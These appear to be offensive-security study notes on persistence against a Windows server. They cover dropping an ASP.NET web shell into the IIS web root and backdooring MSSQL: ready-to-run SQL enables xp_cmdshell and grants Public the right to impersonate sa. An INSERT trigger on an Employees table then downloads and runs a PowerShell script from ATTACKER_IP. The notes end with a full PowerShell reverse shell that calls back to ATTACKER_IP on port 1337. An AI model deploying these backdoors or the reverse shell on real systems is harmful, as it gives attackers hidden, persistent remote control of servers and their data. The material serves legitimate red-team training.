
## Using Web Shells
- upload a web shell to the web directory
- It will have privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`
-  it has the special `SeImpersonatePrivilege`, providing an easy way to escalate
- ASP.NET webshel can be downloaded from here [WebShell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)

```
move shell.aspx C:\inetpub\wwwroot\
```

Now it is served on the website of target IP address.

## Using MSSQL as a Backdoor

- One of the ways is to abuse triggers in database
-  create a trigger for any INSERT into the `HRDB` database
- Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure
- `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default
- To enable `xp_cmdshell` , run following SQL queries in `MS SQL Server Management Studio`


```sql
-- Enable Advance options
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

-- Enable xp_cmdshell function
sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO


-- Ensure that any user can run xp_cmdshell
-- Grant everyone to imporsonate sysadmin `sa`
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];

-- Create Trigger on the database insert query
-- It will run the command script from the downloaded evilscript.ps1
USE HRDB;

CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

- Host `evilscript.ps1` somewhere
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",1337);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```